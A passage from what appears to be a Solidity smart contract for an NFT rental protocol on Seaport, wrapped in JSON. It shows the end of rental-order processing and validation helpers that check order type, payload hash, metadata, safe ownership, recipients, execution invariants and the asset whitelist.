{\n                    // Send ERC721 to the rental wallet.\n                    item.transferERC721(order.rentalWallet);\n                } else if (item.isERC1155()) {\n                    // Send ERC1155 to the rental wallet.\n                    item.transferERC1155(order.rentalWallet);\n                }\n            }\n\n            // Interaction: Process the hooks associated with this rental.\n            if (payload.metadata.hooks.length > 0) {\n                _addHooks(\n                    payload.metadata.hooks,\n                    seaportPayload.offer,\n                    payload.fulfillment.recipient\n                );\n            }\n\n            // Emit rental order started.\n            _emitRentalOrderStarted(order, orderHash, payload.metadata.emittedExtraData);\n        }\n    }\n\n    /**\n     * @dev Checks that the seaport order type is supported.\n     *\n     * @param orderType Order type for the order to fulfill.\n     */\n    function _isValidSeaportOrderType(SeaportOrderType orderType) internal pure {\n        if (orderType != SeaportOrderType.FULL_RESTRICTED) {\n            revert Errors.CreatePolicy_SeaportOrderTypeNotSupported(orderType);\n        }\n    }\n\n    /**\n     * @dev Checks that a payload is being used for the correct seaport order.\n     *\n     * @param payloadOrderHash Order hash that the payload expects.\n     * @param seaportOrderHash Order hash of the order being fulfilled.\n     */\n    function _isValidPayloadForOrder(\n        bytes32 payloadOrderHash,\n        bytes32 seaportOrderHash\n    ) internal pure {\n        if (payloadOrderHash != seaportOrderHash) {\n            revert Errors.CreatePolicy_InvalidPayloadForOrderHash(\n                payloadOrderHash,\n                seaportOrderHash\n            );\n        }\n    }\n\n    /**\n     * @dev Checks that the order metadata passed with the seaport order is expected.\n     *\n     * @param metadata Order metadata that was passed in with the fulfillment.\n     * @param zoneHash Hash of the order metadata that was passed in when the Seaport\n     *                 order was signed.\n     */\n    function _isValidOrderMetadata(\n        OrderMetadata memory metadata,\n        bytes32 zoneHash\n    ) internal view {\n        // Check that the rent duration specified is not too long.\n        if (STORE.maxRentDuration() < metadata.rentDuration) {\n            revert Errors.CreatePolicy_RentDurationTooLong(metadata.rentDuration);\n        }\n\n        // Check that the rent duration specified is not zero.\n        if (metadata.rentDuration == 0) {\n            revert Errors.CreatePolicy_RentDurationZero();\n        }\n\n        // Check that the zone hash is equal to the derived hash of the metadata.\n        if (_deriveOrderMetadataHash(metadata) != zoneHash) {\n            revert Errors.CreatePolicy_InvalidOrderMetadataHash();\n        }\n    }\n\n    /**\n     * @dev Checks that an address is the owner of a protocol-deployed rental safe.\n     *\n     * @param owner Address of the potential safe owner.\n     * @param safe  Address of the potential protocol-deployed rental safe.\n     */\n    function _isValidSafeOwner(address owner, address safe) internal view {\n        // Make sure only protocol-deployed safes can rent.\n        if (STORE.deployedSafes(safe) == 0) {\n            revert Errors.CreatePolicy_InvalidRentalSafe(safe);\n        }\n\n        // Make sure the fulfiller is the owner of the recipient rental safe.\n        if (!ISafe(safe).isOwner(owner)) {\n            revert Errors.CreatePolicy_InvalidSafeOwner(owner, safe);\n        }\n    }\n\n    /**\n     * @dev Checks that none of the consideration item recipients are set to the offerer\n     * of the order. Since seaport views these consideration items as a no-op, it will\n     * result in them not being included in the array of `totalExecutions`.\n     *\n     * @param offerer \t\t Address of the order offerer.\n     * @param considerations Each consideration item in the order being processed.\n     */\n    function _offererNotRecipient(\n        address offerer,\n        ReceivedItem[] memory considerations\n    ) internal pure {\n        for (uint256 i = 0; i < considerations.length; ++i) {\n            if (offerer == considerations[i].recipient) {\n                revert Errors.CreatePolicy_OffererCannotBeRecipient();\n            }\n        }\n    }\n\n    /**\n     * @dev After a Seaport order has been executed, invariant checks are made to ensure\n     *      that all assets were sent to the correct address. More specifically, all\n     *      tokens must first be sent to the Create Policy.\n     *\n     * @param executions Each execution that was performed by Seaport.\n     */\n    function _executionInvariantChecks(ReceivedItem[] memory executions) internal view {\n        for (uint256 i = 0; i < executions.length; ++i) {\n            ReceivedItem memory execution = executions[i];\n\n            // All tokens must first be sent to the Create Policy.\n            if (execution.recipient != address(this)) {\n                revert Errors.CreatePolicy_UnexpectedTokenRecipient(\n                    execution.itemType,\n                    execution.token,\n                    execution.identifier,\n                    execution.amount,\n                    execution.recipient,\n                    address(this)\n                );\n            }\n        }\n    }\n\n    /**\n     * @dev Determines if an array of items are supported by the protocol whitelist.\n     *\n     * @param items The items generated by the incoming rental order.\n     */\n    function _checkProtocolWhitelist(Item[] memory items) internal view {\n        for (uint256 i = 0; i < items.length; ++i) {\n            // Get the token address for the item\n            address token = items[i].token;\n\n            // Check that a rented asset exists in the whitelisted assets mapping.\n            if (items[i].isRental() && !STORE.assetEnabledForRent(token)) {\n                revert Errors.CreatePolicy_AssetNotWhitelisted(token);\n            }\n\n            // Check that a payment exists in"
    }
  ]
}